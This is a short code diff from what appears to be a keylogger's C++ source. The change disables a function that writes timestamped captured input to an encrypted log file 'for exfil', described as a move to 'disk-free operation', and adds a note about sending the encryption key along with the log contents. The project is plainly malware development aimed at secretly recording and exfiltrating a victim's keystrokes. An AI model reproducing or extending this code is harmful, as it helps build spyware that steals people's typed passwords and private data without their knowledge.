@@ -55,9 +55,11 @@ namespace IO
 		}
 	}
 
+	//The writeToLog function has been temp disabled to facilitate the transition to disk-free operation
+
 	//Below is a template function which will take inputs and write it to our key log file for exfil
 
-	template <typename T1>
+	/*template <typename T1>
 	std::string writeToLog(const T1 &input)
 	{
 
@@ -81,7 +83,7 @@ namespace IO
 			keyLog.open(filePath, std::ios::app);
 			
 			//If log file could not be created for some reason, return empty string
-			if (!keyLog)
+			if (!keyLog.is_open())
 			{
 				Auxiliary::logError("writeToLog() - Could not create log file!");
 			}
@@ -92,9 +94,10 @@ namespace IO
 				//Insert given data and timestamps to stream
 				outputStream << "[" << dateTime.getDTString("/", " ", ":") << "]" << std::endl << input << std::endl;
 
-				//Encode and saltify that data
+				//Encrypy that data with AES-256
 				std::string insertData = Transformer::aesEncrypt(outputStream.str());
 
+				//Need to figure out how to securley transmit the key along with the log content
 				insertData +=  "\n\nkey: " + Transformer::getEncryptionKey();
 				insertData += "\niv: " + Transformer::getIV();
 
@@ -111,7 +114,7 @@ namespace IO
 		{
 			//Do nothing...
 		}
-	}
+	}*/
 }
 
 #endif // !IO_H
